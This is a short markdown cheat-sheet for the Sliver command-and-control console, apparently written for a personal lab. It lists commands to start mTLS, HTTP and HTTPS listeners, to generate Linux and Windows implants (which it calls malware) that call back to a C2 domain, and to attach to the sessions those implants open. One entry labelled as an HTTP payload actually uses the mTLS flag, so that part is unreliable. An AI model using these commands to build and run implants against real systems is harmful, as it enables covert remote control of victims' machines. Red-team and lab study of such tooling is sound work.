# Sliver CLI Cheat-Sheet

This cheat-sheet provides a practical reference for essential commands within the interactive Sliver C2 console, categorized by operational phases.

---

### 1. Listener Management
Listeners are required to catch incoming connections from implants or payload delivery requests.

| Command | Description |
| :--- | :--- |
| `jobs` | Lists all active background listener jobs and their IDs. |
| `jobs -k <id>` | Kills/stops a specific running listener by its ID. |
| `mtls --lport 31337` | Starts an mTLS listener on a specific port (Default: 31337). |
| `http --lport 8082` | Starts an HTTP listener on a specific port for web callbacks. |
| `https --lport 443` | Starts an encrypted HTTPS listener for stealthier traffic. |

---

### 2. Payload Generation (Implants)
Implants are the actual malware binaries executed on the target system. 

* **mTLS Linux Binary (64-bit):**
```bash
> generate --mtls c2.david-lab.de --os linux --arch amd64 --save /tmp/
```
* **HTTP Windows Binary (64-bit):**
```bash
> generate --mtls c2.david-lab.de --os windows --arch amd64 --save /tmp/
```
* **Staged Payload (Beacon):**
```bash
> generate beacon --http c2.david-lab.de --os windows --arch amd64
```

--- 

### 3. Session & Target Management
Once an implant executes and calls back, it establishes an interactive session.

Command | Description |
| :--- | :--- |
| `sessions` | Lists all currently active, established connections. |
| `beacons` | Lists active beaconing implants (periodic check-ins). |
| `use <session-id>` | Interactively attaches to a specific session (e.g., use 1) |
| `background` | Safely exits an active session context back to the main menu |

---
